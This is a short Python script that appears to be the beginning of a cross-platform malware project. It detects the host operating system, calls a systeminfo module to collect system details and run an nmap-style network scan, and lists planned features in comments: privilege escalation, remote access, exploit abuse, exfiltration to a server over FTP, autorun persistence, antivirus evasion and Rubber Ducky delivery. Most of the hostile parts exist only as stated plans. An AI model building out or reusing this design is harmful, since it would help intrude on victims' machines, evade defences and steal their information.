import os
import sys
import platform
import time 
import systeminfo

#Ideas List:              
#1. Make the program have an android feature
#2. Allow it to get all clients on a network
#3. Privledge excalation (but works without it too)
#4. Has a Remote Access feature
#5. Abuse certain exploits
#6. Sends information to server through FTP
#7. Autoruns during startup every time computer starts (no matter what operating system)
#8. Is able to perform the same on Mac/Windows with Linux systems
#9. Isn't detectable by most anti-virus software
#10. Has a Digispark/Rubber Ducky setup - more information:              
#https://www.github.com/lin8x/arduino-digiducky
                           
#checks for the platform of the system
p = platform.system()     
if "Linux" == p:            
  print("Tux-idos are very fashionable nowadays~")
  #get system information for Linux
  systeminfo.getLinux()   

elif "Windows" == p:      
  #changes the color to yellow, in case the cmd line shows up       
  os.system("color fe")   
  print("Windows cover up the sun!")
  #get system information for the Windows System
  systeminfo.getWindows() 

elif "Darwin" == p:
  print("Macs are apples.")
  #get system information for the Mac System
  systeminfo.getMac()
else:
  print("os machine broke")

systeminfo.nmap()



